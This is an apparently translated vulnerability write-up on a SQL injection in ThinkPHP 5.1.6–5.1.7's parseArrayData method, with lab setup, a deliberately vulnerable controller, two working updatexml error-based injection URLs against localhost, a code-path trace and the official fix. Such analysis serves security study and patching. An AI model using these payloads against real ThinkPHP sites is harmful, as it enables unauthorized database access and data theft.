# ThinkPHP5.1.x SQL injection (Update)

Author: H3rmesk1t

Data: 2021.08.13

# Vulnerability Summary

- This vulnerability exists in the `parseArrayData` method of the `Mysql` class. Since the program does not filter the data well, the data is spliced ​​into SQL statements, resulting in the occurrence of SQL injection vulnerability
- Vulnerability impact version: 5.1.6<=ThinkPHP<=5.1.7 (Non-Latest 5.1.8 version is also available)
# Initial configuration
- Get the test environment code

```bash
composer create-project --prefer-dist topthink/think=5.1 tpH3rmesk1t
```
![Insert the picture description here](https://img-blog.csdnimg.cn/ad95b5b9781f4b9fabccb2dbae673760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Set the require field of the composer.json file to the following

````bas
"require": {
    "php": ">=5.6.0",
    "topthink/framework": "5.1.7"
}
```

Then execute `composer update`

![Insert the picture description here](https://img-blog.csdnimg.cn/344ef95318c342f1914da5e9a4f90185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

- In the downloaded source code, the content of `application/index/controller/Index.php` needs to be modified

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()->get('username/a');
        db('users')->where(['id' =1])->update(['username' =$username]);
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:) Master Gyan will always beg for the gods! ! ! </h1><pThinkPHP V5.1<br/><span style="font-size:30px">12 years of original intention remains unchanged (2006-2018) - Your trustworthy PHP framework</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }
}
?>
```

Configure database-related information in the `config/database.php` file, and enable app_debug and app_trace in `config/app.php`. Create database information as follows

```php
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null,
);
insert into users(id,username) values(1,'H3rmesk1t');
```
# Vulnerability Exploit

Payload:
```nash
http://127.0.0.1/cms/public/index.php?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,database(),0x7e),1)^&username[3]=0
or
http://127.0.0.1/cms/public/index.php?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,database(),0x7e),1)|&username[3]=0
```
![Insert the picture description here](https://img-blog.csdnimg.cn/8d04b60646ea4ee08e63f5be947c0671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Analysis
Break the point first, follow up the payload, and receive the variable first

![Insert the picture description here](https://img-blog.csdnimg.cn/497edc01ad754de7ac65fbcf51aae8de.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up to the `db` method in `thinkphp/helper.php`

![Insert the picture description here](https://img-blog.csdnimg.cn/7fd6c6d62f8b473b990ed3fcc32bf57f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up to the `where` method in `thinkphp/library/think/db/Query.php`, and then enter the `update` method.

![Insert the picture description here](https://img-blog.csdnimg.cn/83563ac2ac794d448e715778625a3b04.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/424b57587df04c6e9e7e88c397e6b312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the return, follow the `update` method of the `connect` class in `thinkphp/library/think/db/Connection.php`, and find the SQL statement that generates the update `$sql =
$this->builder->update($query);`, follow up on this statement to see what it did

![Insert the picture description here](https://img-blog.csdnimg.cn/0ce53b54d52147bb95dd6141fdfa8d50.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on the `update` method in `thinkphp/library/think/db/Builder.php`, and the `parseData` method is called in the `update` method in the `update` method in the `Builder` class.

![Insert the picture description here](https://img-blog.csdnimg.cn/20d4f408690f497b96453b0b84dc476f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on the `parseData` method. There is a `parseArrayData` method in the default statement in the swich statement in the method. Follow in and take a look

![Insert the picture description here](https://img-blog.csdnimg.cn/9d10cf625c63497ba1edba31794f7610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on the parseArrayData method in `thinkphp/library/think/db/builder/Mysql.php`. Here, if the lowercase of the first variable of the array $data is `point`, it will enter the subsequent judgment statement; since `$data[2]` and `$data[3]` are neither empty, it is the value passed in; if statement determines whether ``$data[1]` is an array, if yes, the value of the one-dimensional array is concatenated into a string; finally enters the stitching statement, the stitching form is: `$data[2]('$data[3]($data[1])');`, and the parameters are controllable parameters.

![Insert the picture description here](https://img-blog.csdnimg.cn/34ece30086f24e93bf43dff4bf01c164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Use debug to see the spliced ​​value: `updatexml(1,concat(0x7,database(),0x7e),1)^('0(1)')`, which successfully causes SQL injection

![Insert the picture description here](https://img-blog.csdnimg.cn/5c1c8a82974146ca88ba677c0a23a633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# Vulnerability Fix

Refer to the official repair method, directly delete the `parseArrayData` method

![Insert the picture description here](https://img-blog.csdnimg.cn/e8b76dfbded34fc3ba8d13c743f43120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Attack summary

Refer to Master Mochazz's audit process

![Insert the picture description here](https://img-blog.csdnimg.cn/db1a2b18b6ad4d78b94935e5d4cfe47f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)